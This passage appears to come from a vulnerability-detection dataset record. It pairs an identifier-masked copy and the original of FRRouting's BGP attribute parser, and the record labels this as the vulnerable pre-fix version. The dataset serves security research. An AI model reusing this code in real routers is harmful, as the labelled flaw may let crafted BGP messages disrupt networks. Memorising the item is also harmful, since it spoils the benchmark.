COMMENT_54 */\n                                                                      \n                                               \n       \n\t\t\t\tflog_warn(\n\t\t\t\t\tVAR_29,\n\t\t\t\t\t\"%s: Attribute %s, parse error - treating as withdrawal\",\n\t\t\t\t\tpeer->host, lookup_msg(VAR_30, VAR_5, NULL));\n\t\t\t\tVAR_3 = VAR_21;\n\t\t\t\tstream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));\n\t\t\t\tgoto done;\n\t\t\t}\n\t\t}\n\n\t\t/* COMMENT_58 */\n                                                   \n                                                          \n                                                                  \n                                                              \n     \n\n\t\tif (CHECK_BITMAP(VAR_10, VAR_5)) {\n\t\t\t/* COMMENT_29 */\n\t\t\tif (peer->sort != VAR_17 ||\n\t\t\t\t\tVAR_5 == VAR_31 || VAR_5 == VAR_32) {\n\t\t\t\tflog_warn(\n\t\t\t\t\tVAR_33,\n\t\t\t\t\t\"%s: error BGP attribute type %d appears twice in a message\",\n\t\t\t\t\tpeer->host, VAR_5);\n\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tVAR_18,\n\t\t\t\t\t\tVAR_34);\n\t\t\t\tVAR_3 = VAR_20;\n\t\t\t\tgoto done;\n\t\t\t} else {\n\t\t\t\tflog_warn(\n\t\t\t\t\tVAR_33,\n\t\t\t\t\t\"%s: error BGP attribute type %d appears twice in a message - discard attribute\",\n\t\t\t\t\tpeer->host, VAR_5);\n\t\t\t\t/* COMMENT_64 */\n                                       \n       \n\t\t\t\tstream_set_getp(BGP_INPUT(peer),\n\t\t\t\t\t(VAR_7 - STREAM_DATA(BGP_INPUT(peer))) + (VAR_9 - VAR_7));\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\t/* COMMENT_67 */\n                                                        \n\n\t\tSET_BITMAP(VAR_10, VAR_5);\n\n\t\tstruct bgp_attr_parser_args VAR_35 = {\n\t\t\t.peer = peer,\n\t\t\t.length = VAR_6,\n\t\t\t.attr = attr,\n\t\t\t.type = VAR_5,\n\t\t\t.flags = VAR_4,\n\t\t\t.startp = VAR_7,\n\t\t\t.total = VAR_9 - VAR_7,\n\t\t};\n\n\n\t\t/* COMMENT_69 */\n                                                                \n       \n                                                                  \n                                           \n\t\tif (bgp_attr_flag_invalid(&VAR_35)) {\n\t\t\tVAR_3 = bgp_attr_malformed(\n\t\t\t\t&VAR_35, VAR_36,\n\t\t\t\tVAR_35.total);\n\t\t\tif (VAR_3 == VAR_37)\n\t\t\t\tcontinue;\n\t\t\tstream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* COMMENT_74 */\n\t\tswitch (VAR_5) {\n\t\tcase VAR_38:\n\t\t\tVAR_3 = bgp_attr_origin(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_39:\n\t\t\tVAR_3 = bgp_attr_aspath(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_40:\n\t\t\tVAR_3 = bgp_attr_as4_path(&VAR_35, &VAR_12);\n\t\t\tbreak;\n\t\tcase VAR_41:\n\t\t\tVAR_3 = bgp_attr_nexthop(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_42:\n\t\t\tVAR_3 = bgp_attr_med(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_43:\n\t\t\tVAR_3 = bgp_attr_local_pref(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_44:\n\t\t\tVAR_3 = bgp_attr_atomic(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_45:\n\t\t\tVAR_3 = bgp_attr_aggregator(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_46:\n\t\t\tVAR_3 = bgp_attr_as4_aggregator(&VAR_35,\n\t\t\t\t\t\t      &VAR_13,\n\t\t\t\t\t\t      &VAR_14);\n\t\t\tbreak;\n\t\tcase VAR_47:\n\t\t\tVAR_3 = bgp_attr_community(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_48:\n\t\t\tVAR_3 = bgp_attr_large_community(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_49:\n\t\t\tVAR_3 = bgp_attr_originator_id(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_50:\n\t\t\tVAR_3 = bgp_attr_cluster_list(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_31:\n\t\t\tVAR_3 = bgp_mp_reach_parse(&VAR_35, VAR_1);\n\t\t\tbreak;\n\t\tcase VAR_32:\n\t\t\tVAR_3 = bgp_mp_unreach_parse(&VAR_35, VAR_2);\n\t\t\tbreak;\n\t\tcase VAR_51:\n\t\t\tVAR_3 = bgp_attr_ext_communities(&VAR_35);\n\t\t\tbreak;\n#ifdef VAR_52\n\t\tcase VAR_53:\n#endif\n\t\tcase VAR_54:\n\t\t\tVAR_3 = bgp_attr_encap(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_55:\n\t\t\tVAR_3 = bgp_attr_prefix_sid(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_56:\n\t\t\tVAR_3 = bgp_attr_pmsi_tunnel(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_57:\n\t\t\tVAR_3 = bgp_attr_ipv6_ext_communities(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_58:\n\t\t\tVAR_3 = bgp_attr_otc(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_59:\n\t\t\tVAR_3 = bgp_attr_aigp(&VAR_35);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tVAR_3 = bgp_attr_unknown(&VAR_35);\n\t\t\tbreak;\n\t\t}\n\n\t\tif (VAR_3 == VAR_60) {\n\t\t\tbgp_notify_send(peer->connection, VAR_18,\n\t\t\t\t\tVAR_34);\n\t\t\tVAR_3 = VAR_20;\n\t\t\tgoto done;\n\t\t}\n\n\t\tif (VAR_3 == VAR_20) {\n\t\t\tflog_warn(VAR_61,\n\t\t\t\t  \"%s: Attribute %s, parse error\", peer->host,\n\t\t\t\t  lookup_msg(VAR_30, VAR_5, NULL));\n\t\t\tgoto done;\n\t\t}\n\t\tif (VAR_3 == VAR_21) {\n\t\t\tflog_warn(\n\t\t\t\tVAR_29,\n\t\t\t\t\"%s: Attribute %s, parse error - treating as withdrawal\",\n\t\t\t\tpeer->host, lookup_msg(VAR_30, VAR_5, NULL));\n\t\t\tstream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* COMMENT_75 */\n\t\tif (BGP_INPUT_PNT(peer) != VAR_9) {\n\t\t\tflog_warn(VAR_62,\n\t\t\t\t  \"%s: BGP attribute %s, fetch error\",\n\t\t\t\t  peer->host, lookup_msg(VAR_30, VAR_5, NULL));\n\t\t\tbgp_notify_send(peer->connection, VAR_18,\n\t\t\t\t\tVAR_19);\n\t\t\tVAR_3 = VAR_20;\n\t\t\tgoto done;\n\t\t}\n\t}\n\n\t/* COMMENT_76 */\n                                               \n                                    \n                                                              \n                                                             \n                                                   \n                                                                         \n    \n\tif (!attr->mp_nexthop_len || VAR_1->safi != VAR_63)\n\t\tattr->label_index = VAR_64;\n\n\t/* COMMENT_84 */\n\tif (BGP_INPUT_PNT(peer) != VAR_8) {\n\t\tflog_warn(VAR_65,\n\t\t\t  \"%s: BGP attribute %s, length mismatch\", peer->host,\n\t\t\t  lookup_msg(VAR_30, VAR_5, NULL));\n\t\tbgp_notify_send(peer->connection, VAR_18,\n\t\t\t\tVAR_19);\n\n\t\tVAR_3 = VAR_20;\n\t\tgoto done;\n\t}\n\n\t/* COMMENT_85 */\n                                                                        \n                                                                     \n                                                                       \n                                                                     \n                                                                         \n                                                              \n   \n                                                                       \n                                                                         \n                                                                         \n                                                                   \n    \n\tif (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_41))\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_31))) {\n\t\tif (bgp_attr_nexthop_valid(peer, attr) < 0) {\n\t\t\tVAR_3 = VAR_20;\n\t\t\tgoto done;\n\t\t}\n\t}\n\n\t/* COMMENT_98 */\n\tVAR_3 = bgp_attr_check(peer, attr, VAR_6);\n\tif (VAR_3 < 0)\n\t\tgoto done;\n\n\t/* COMMENT_99 */\n                                                           \n                                                         \n                                                               \n                                                                 \n                                                               \n                                  \n                                                                 \n                                                              \n                                                                    \n   \n                                                            \n                    \n    \n\t/* COMMENT_113 */\n                             \n\tif (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_39))\n\t    && bgp_attr_munge_as4_attrs(peer, attr, VAR_12, VAR_13,\n\t\t\t\t\t&VAR_14)) {\n\t\tbgp_notify_send(peer->connection, VAR_18,\n\t\t\t\tVAR_34);\n\t\tVAR_3 = VAR_20;\n\t\tgoto done;\n\t}\n\n\t/* COMMENT_115 */\n                                                         \n                                                           \n    \n\tif (attr->flag & (ATTR_FLAG_BIT(VAR_39))) {\n\t\tVAR_3 = bgp_attr_aspath_check(peer, attr);\n\t\tif (VAR_3 != VAR_37)\n\t\t\tgoto done;\n\t}\n\n\tVAR_3 = VAR_37;\ndone:\n\n\t/* COMMENT_119 */\n                                                              \n                                                               \n                                                                 \n                  \n    \n\t/* COMMENT_125 */\n                                \n                                                      \n                           \n    \n\taspath_unintern(&VAR_12);\n\n\ttransit = bgp_attr_get_transit(attr);\n\tif (VAR_3 != VAR_20) {\n\t\t/* COMMENT_130 */\n\t\tif (transit)\n\t\t\tbgp_attr_set_transit(attr, transit_intern(transit));\n\t\tif (attr->encap_subtlvs)\n\t\t\tattr->encap_subtlvs = encap_intern(attr->encap_subtlvs,\n\t\t\t\t\t\t\t   VAR_66);\n#ifdef VAR_67\n\t\tstruct bgp_attr_encap_subtlv *VAR_68 =\n\t\t\tbgp_attr_get_vnc_subtlvs(attr);\n\n\t\tif (VAR_68)\n\t\t\tbgp_attr_set_vnc_subtlvs(\n\t\t\t\tattr,\n\t\t\t\tencap_intern(VAR_68, VAR_69));\n#endif\n\t} else {\n\t\tif (transit) {\n\t\t\ttransit_free(transit);\n\t\t\tbgp_attr_set_transit(attr, NULL);\n\t\t}\n\n\t\tbgp_attr_flush_encap(attr);\n\t};\n\n\t/* COMMENT_131 */\n\ttransit = bgp_attr_get_transit(attr);\n\tif (transit)\n\t\tassert(transit->refcnt > 0);\n\tif (attr->encap_subtlvs)\n\t\tassert(attr->encap_subtlvs->refcnt > 0);\n#ifdef VAR_67\n\tstruct bgp_attr_encap_subtlv *VAR_68 =\n\t\tbgp_attr_get_vnc_subtlvs(attr);\n\n\tif (VAR_68)\n\t\tassert(VAR_68->refcnt > 0);\n#endif\n\n\treturn VAR_3;\n}",
  "func_graph_path_before": "FRRouting/frr/6814f2e0138a6ea5e1f83bdd9085d9a77999900b/bgp_attr.c/vul/before/0.json",
  "func": "enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,\n\t\t\t\t       bgp_size_t size,\n\t\t\t\t       struct bgp_nlri *mp_update,\n\t\t\t\t       struct bgp_nlri *mp_withdraw)\n{\n\tenum bgp_attr_parse_ret ret;\n\tuint8_t flag = 0;\n\tuint8_t type = 0;\n\tbgp_size_t length = 0;\n\tuint8_t *startp, *endp;\n\tuint8_t *attr_endp;\n\tuint8_t seen[BGP_ATTR_BITMAP_SIZE];\n\t/* we need the as4_path only until we have synthesized the as_path with\n\t * it */\n\t/* same goes for as4_aggregator */\n\tstruct aspath *as4_path = NULL;\n\tas_t as4_aggregator = 0;\n\tstruct in_addr as4_aggregator_addr = {.s_addr = 0};\n\tstruct transit *transit;\n\n\t/* Initialize bitmap. */\n\tmemset(seen, 0, BGP_ATTR_BITMAP_SIZE);\n\n\t/* End pointer of BGP attribute. */\n\tendp = BGP_INPUT_PNT(peer) + size;\n\n\t/* Get attributes to the end of attribute length. */\n\twhile (BGP_INPUT_PNT(peer) < endp) {\n\t\tstartp = BGP_INPUT_PNT(peer);\n\n\t\t/* Fewer than three octets remain (or fewer than four\n\t\t * octets, if the Attribute Flags field has the Extended\n\t\t * Length bit set) when beginning to parse the attribute.\n\t\t * That is, this case exists if there remains unconsumed\n\t\t * data in the path attributes but yet insufficient data\n\t\t * to encode a single minimum-sized path attribute.\n\t\t *\n\t\t * An error condition exists and the \"treat-as-withdraw\"\n\t\t * approach MUST be used (unless some other, more severe\n\t\t * error is encountered dictating a stronger approach),\n\t\t * and the Total Attribute Length MUST be relied upon to\n\t\t * enable the beginning of the NLRI field to be located.\n\t\t */\n\n\t\t/* Check remaining length check.*/\n\t\tif ((endp - startp) < BGP_ATTR_MIN_LEN) {\n\t\t\t/* XXX warning: long int format, int arg (arg 5) */\n\t\t\tflog_warn(\n\t\t\t\tEC_BGP_ATTRIBUTE_TOO_SMALL,\n\t\t\t\t\"%s: error BGP attribute length %lu is smaller than min len\",\n\t\t\t\tpeer->host,\n\t\t\t\t(unsigned long)(endp\n\t\t\t\t\t\t- stream_pnt(BGP_INPUT(peer))));\n\n\t\t\tif (peer->sort != BGP_PEER_EBGP) {\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_ATTR_LENG_ERR);\n\t\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\t} else {\n\t\t\t\tret = BGP_ATTR_PARSE_WITHDRAW;\n\t\t\t}\n\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* Fetch attribute flag and type.\n\t\t * The lower-order four bits of the Attribute Flags octet are\n\t\t * unused. They MUST be zero when sent and MUST be ignored when\n\t\t * received.\n\t\t */\n\t\tflag = 0xF0 & stream_getc(BGP_INPUT(peer));\n\t\ttype = stream_getc(BGP_INPUT(peer));\n\n\t\t/* Check whether Extended-Length applies and is in bounds */\n\t\tif (CHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN)\n\t\t    && ((endp - startp) < (BGP_ATTR_MIN_LEN + 1))) {\n\t\t\tflog_warn(\n\t\t\t\tEC_BGP_EXT_ATTRIBUTE_TOO_SMALL,\n\t\t\t\t\"%s: Extended length set, but just %lu bytes of attr header\",\n\t\t\t\tpeer->host,\n\t\t\t\t(unsigned long)(endp\n\t\t\t\t\t\t- stream_pnt(BGP_INPUT(peer))));\n\n\t\t\tif (peer->sort != BGP_PEER_EBGP) {\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_ATTR_LENG_ERR);\n\t\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\t} else {\n\t\t\t\tret = BGP_ATTR_PARSE_WITHDRAW;\n\t\t\t}\n\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* Check extended attribue length bit. */\n\t\tif (CHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN))\n\t\t\tlength = stream_getw(BGP_INPUT(peer));\n\t\telse\n\t\t\tlength = stream_getc(BGP_INPUT(peer));\n\n\t\t/* Overflow check. */\n\t\tattr_endp = BGP_INPUT_PNT(peer) + length;\n\n\t\tif (attr_endp > endp) {\n\t\t\tflog_warn(\n\t\t\t\tEC_BGP_ATTRIBUTE_TOO_LARGE,\n\t\t\t\t\"%s: BGP type %d length %d is too large, attribute total length is %d.  attr_endp is %p.  endp is %p\",\n\t\t\t\tpeer->host, type, length, size, attr_endp,\n\t\t\t\tendp);\n\n\t\t\t/* Only relax error handling for eBGP peers */\n\t\t\tif (peer->sort != BGP_PEER_EBGP) {\n\t\t\t\t/*\n\t\t\t\t * RFC 4271 6.3\n\t\t\t\t * If any recognized attribute has an Attribute\n\t\t\t\t * Length that conflicts with the expected length\n\t\t\t\t * (based on the attribute type code), then the\n\t\t\t\t * Error Subcode MUST be set to Attribute Length\n\t\t\t\t * Error.  The Data field MUST contain the erroneous\n\t\t\t\t * attribute (type, length, and value).\n\t\t\t\t * ----------\n\t\t\t\t * We do not currently have a good way to determine the\n\t\t\t\t * length of the attribute independent of the length\n\t\t\t\t * received in the message. Instead we send the\n\t\t\t\t * minimum between the amount of data we have and the\n\t\t\t\t * amount specified by the attribute length field.\n\t\t\t\t *\n\t\t\t\t * Instead of directly passing in the packet buffer and\n\t\t\t\t * offset we use the stream_get* functions to read into\n\t\t\t\t * a stack buffer, since they perform bounds checking\n\t\t\t\t * and we are working with untrusted data.\n\t\t\t\t */\n\t\t\t\tunsigned char ndata[peer->max_packet_size];\n\n\t\t\t\tmemset(ndata, 0x00, sizeof(ndata));\n\t\t\t\tsize_t lfl =\n\t\t\t\t\tCHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN) ? 2 : 1;\n\t\t\t\t/* Rewind to end of flag field */\n\t\t\t\tstream_rewind_getp(BGP_INPUT(peer), (1 + lfl));\n\t\t\t\t/* Type */\n\t\t\t\tstream_get(&ndata[0], BGP_INPUT(peer), 1);\n\t\t\t\t/* Length */\n\t\t\t\tstream_get(&ndata[1], BGP_INPUT(peer), lfl);\n\t\t\t\t/* Value */\n\t\t\t\tsize_t atl = attr_endp - startp;\n\t\t\t\tsize_t ndl = MIN(atl, STREAM_READABLE(BGP_INPUT(peer)));\n\n\t\t\t\tstream_get(&ndata[lfl + 1], BGP_INPUT(peer), ndl);\n\n\t\t\t\tbgp_notify_send_with_data(peer->connection,\n\t\t\t\t\t\t\t  BGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\t\t\t  BGP_NOTIFY_UPDATE_ATTR_LENG_ERR,\n\t\t\t\t\t\t\t  ndata, ndl + lfl + 1);\n\n\t\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\t\tgoto done;\n\t\t\t} else {\n\t\t\t\t/* Handling as per RFC7606 section 4, treat-as-withdraw approach\n\t\t\t\t * must be followed when the total attribute length is in conflict\n\t\t\t\t * with the enclosed path attribute length.\n\t\t\t\t */\n\t\t\t\tflog_warn(\n\t\t\t\t\tEC_BGP_ATTRIBUTE_PARSE_WITHDRAW,\n\t\t\t\t\t\"%s: Attribute %s, parse error - treating as withdrawal\",\n\t\t\t\t\tpeer->host, lookup_msg(attr_str, type, NULL));\n\t\t\t\tret = BGP_ATTR_PARSE_WITHDRAW;\n\t\t\t\tstream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));\n\t\t\t\tgoto done;\n\t\t\t}\n\t\t}\n\n\t\t/* If attribute appears more than once in the UPDATE message,\n\t\t * for MP_REACH_NLRI & MP_UNREACH_NLRI attributes\n\t\t * the Error Subcode is set to Malformed Attribute List.\n\t\t * For all other attributes, all the occurances of the attribute\n\t\t * other than the first occurence is discarded. (RFC7606 3g)\n\t\t */\n\n\t\tif (CHECK_BITMAP(seen, type)) {\n\t\t\t/* Only relax error handling for eBGP peers */\n\t\t\tif (peer->sort != BGP_PEER_EBGP ||\n\t\t\t\t\ttype == BGP_ATTR_MP_REACH_NLRI || type == BGP_ATTR_MP_UNREACH_NLRI) {\n\t\t\t\tflog_warn(\n\t\t\t\t\tEC_BGP_ATTRIBUTE_REPEATED,\n\t\t\t\t\t\"%s: error BGP attribute type %d appears twice in a message\",\n\t\t\t\t\tpeer->host, type);\n\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_MAL_ATTR);\n\t\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\t\tgoto done;\n\t\t\t} else {\n\t\t\t\tflog_warn(\n\t\t\t\t\tEC_BGP_ATTRIBUTE_REPEATED,\n\t\t\t\t\t\"%s: error BGP attribute type %d appears twice in a message - discard attribute\",\n\t\t\t\t\tpeer->host, type);\n\t\t\t\t/* Adjust the stream getp to the end of the attribute, in case we\n\t\t\t\t * haven't read all the attributes.\n\t\t\t\t */\n\t\t\t\tstream_set_getp(BGP_INPUT(peer),\n\t\t\t\t\t(startp - STREAM_DATA(BGP_INPUT(peer))) + (attr_endp - startp));\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\t/* Set type to bitmap to check duplicate attribute.  `type' is\n\t\t   unsigned char so it never overflow bitmap range. */\n\n\t\tSET_BITMAP(seen, type);\n\n\t\tstruct bgp_attr_parser_args attr_args = {\n\t\t\t.peer = peer,\n\t\t\t.length = length,\n\t\t\t.attr = attr,\n\t\t\t.type = type,\n\t\t\t.flags = flag,\n\t\t\t.startp = startp,\n\t\t\t.total = attr_endp - startp,\n\t\t};\n\n\n\t\t/* If any recognized attribute has Attribute Flags that conflict\n\t\t   with the Attribute Type Code, then the Error Subcode is set\n\t\t   to\n\t\t   Attribute Flags Error.  The Data field contains the erroneous\n\t\t   attribute (type, length and value). */\n\t\tif (bgp_attr_flag_invalid(&attr_args)) {\n\t\t\tret = bgp_attr_malformed(\n\t\t\t\t&attr_args, BGP_NOTIFY_UPDATE_ATTR_FLAG_ERR,\n\t\t\t\tattr_args.total);\n\t\t\tif (ret == BGP_ATTR_PARSE_PROCEED)\n\t\t\t\tcontinue;\n\t\t\tstream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* OK check attribute and store it's value. */\n\t\tswitch (type) {\n\t\tcase BGP_ATTR_ORIGIN:\n\t\t\tret = bgp_attr_origin(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_AS_PATH:\n\t\t\tret = bgp_attr_aspath(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_AS4_PATH:\n\t\t\tret = bgp_attr_as4_path(&attr_args, &as4_path);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_NEXT_HOP:\n\t\t\tret = bgp_attr_nexthop(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_MULTI_EXIT_DISC:\n\t\t\tret = bgp_attr_med(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_LOCAL_PREF:\n\t\t\tret = bgp_attr_local_pref(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_ATOMIC_AGGREGATE:\n\t\t\tret = bgp_attr_atomic(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_AGGREGATOR:\n\t\t\tret = bgp_attr_aggregator(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_AS4_AGGREGATOR:\n\t\t\tret = bgp_attr_as4_aggregator(&attr_args,\n\t\t\t\t\t\t      &as4_aggregator,\n\t\t\t\t\t\t      &as4_aggregator_addr);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_COMMUNITIES:\n\t\t\tret = bgp_attr_community(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_LARGE_COMMUNITIES:\n\t\t\tret = bgp_attr_large_community(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_ORIGINATOR_ID:\n\t\t\tret = bgp_attr_originator_id(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_CLUSTER_LIST:\n\t\t\tret = bgp_attr_cluster_list(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_MP_REACH_NLRI:\n\t\t\tret = bgp_mp_reach_parse(&attr_args, mp_update);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_MP_UNREACH_NLRI:\n\t\t\tret = bgp_mp_unreach_parse(&attr_args, mp_withdraw);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_EXT_COMMUNITIES:\n\t\t\tret = bgp_attr_ext_communities(&attr_args);\n\t\t\tbreak;\n#ifdef ENABLE_BGP_VNC_ATTR\n\t\tcase BGP_ATTR_VNC:\n#endif\n\t\tcase BGP_ATTR_ENCAP:\n\t\t\tret = bgp_attr_encap(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_PREFIX_SID:\n\t\t\tret = bgp_attr_prefix_sid(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_PMSI_TUNNEL:\n\t\t\tret = bgp_attr_pmsi_tunnel(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_IPV6_EXT_COMMUNITIES:\n\t\t\tret = bgp_attr_ipv6_ext_communities(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_OTC:\n\t\t\tret = bgp_attr_otc(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_AIGP:\n\t\t\tret = bgp_attr_aigp(&attr_args);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tret = bgp_attr_unknown(&attr_args);\n\t\t\tbreak;\n\t\t}\n\n\t\tif (ret == BGP_ATTR_PARSE_ERROR_NOTIFYPLS) {\n\t\t\tbgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\tBGP_NOTIFY_UPDATE_MAL_ATTR);\n\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\tgoto done;\n\t\t}\n\n\t\tif (ret == BGP_ATTR_PARSE_ERROR) {\n\t\t\tflog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,\n\t\t\t\t  \"%s: Attribute %s, parse error\", peer->host,\n\t\t\t\t  lookup_msg(attr_str, type, NULL));\n\t\t\tgoto done;\n\t\t}\n\t\tif (ret == BGP_ATTR_PARSE_WITHDRAW) {\n\t\t\tflog_warn(\n\t\t\t\tEC_BGP_ATTRIBUTE_PARSE_WITHDRAW,\n\t\t\t\t\"%s: Attribute %s, parse error - treating as withdrawal\",\n\t\t\t\tpeer->host, lookup_msg(attr_str, type, NULL));\n\t\t\tstream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* Check the fetched length. */\n\t\tif (BGP_INPUT_PNT(peer) != attr_endp) {\n\t\t\tflog_warn(EC_BGP_ATTRIBUTE_FETCH_ERROR,\n\t\t\t\t  \"%s: BGP attribute %s, fetch error\",\n\t\t\t\t  peer->host, lookup_msg(attr_str, type, NULL));\n\t\t\tbgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\tBGP_NOTIFY_UPDATE_ATTR_LENG_ERR);\n\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\tgoto done;\n\t\t}\n\t}\n\n\t/*\n\t * draft-ietf-idr-bgp-prefix-sid-27#section-3:\n\t * About Prefix-SID path attribute,\n\t * Label-Index TLV(type1) and The Originator SRGB TLV(type-3)\n\t * may only appear in a BGP Prefix-SID attribute attached to\n\t * IPv4/IPv6 Labeled Unicast prefixes ([RFC8277]).\n\t * It MUST be ignored when received for other BGP AFI/SAFI combinations.\n\t */\n\tif (!attr->mp_nexthop_len || mp_update->safi != SAFI_LABELED_UNICAST)\n\t\tattr->label_index = BGP_INVALID_LABEL_INDEX;\n\n\t/* Check final read pointer is same as end pointer. */\n\tif (BGP_INPUT_PNT(peer) != endp) {\n\t\tflog_warn(EC_BGP_ATTRIBUTES_MISMATCH,\n\t\t\t  \"%s: BGP attribute %s, length mismatch\", peer->host,\n\t\t\t  lookup_msg(attr_str, type, NULL));\n\t\tbgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,\n\t\t\t\tBGP_NOTIFY_UPDATE_ATTR_LENG_ERR);\n\n\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\tgoto done;\n\t}\n\n\t/*\n\t * RFC4271: If the NEXT_HOP attribute field is syntactically incorrect,\n\t * then the Error Subcode MUST be set to Invalid NEXT_HOP Attribute.\n\t * This is implemented below and will result in a NOTIFICATION. If the\n\t * NEXT_HOP attribute is semantically incorrect, the error SHOULD be\n\t * logged, and the route SHOULD be ignored. In this case, a NOTIFICATION\n\t * message SHOULD NOT be sent. This is implemented elsewhere.\n\t *\n\t * RFC4760: An UPDATE message that carries no NLRI, other than the one\n\t * encoded in the MP_REACH_NLRI attribute, SHOULD NOT carry the NEXT_HOP\n\t * attribute. If such a message contains the NEXT_HOP attribute, the BGP\n\t * speaker that receives the message SHOULD ignore this attribute.\n\t */\n\tif (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_NEXT_HOP))\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI))) {\n\t\tif (bgp_attr_nexthop_valid(peer, attr) < 0) {\n\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\tgoto done;\n\t\t}\n\t}\n\n\t/* Check all mandatory well-known attributes are present */\n\tret = bgp_attr_check(peer, attr, length);\n\tif (ret < 0)\n\t\tgoto done;\n\n\t/*\n\t * At this place we can see whether we got AS4_PATH and/or\n\t * AS4_AGGREGATOR from a 16Bit peer and act accordingly.\n\t * We can not do this before we've read all attributes because\n\t * the as4 handling does not say whether AS4_PATH has to be sent\n\t * after AS_PATH or not - and when AS4_AGGREGATOR will be send\n\t * in relationship to AGGREGATOR.\n\t * So, to be defensive, we are not relying on any order and read\n\t * all attributes first, including these 32bit ones, and now,\n\t * afterwards, we look what and if something is to be done for as4.\n\t *\n\t * It is possible to not have AS_PATH, e.g. GR EoR and sole\n\t * MP_UNREACH_NLRI.\n\t */\n\t/* actually... this doesn't ever return failure currently, but\n\t * better safe than sorry */\n\tif (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_AS_PATH))\n\t    && bgp_attr_munge_as4_attrs(peer, attr, as4_path, as4_aggregator,\n\t\t\t\t\t&as4_aggregator_addr)) {\n\t\tbgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,\n\t\t\t\tBGP_NOTIFY_UPDATE_MAL_ATTR);\n\t\tret = 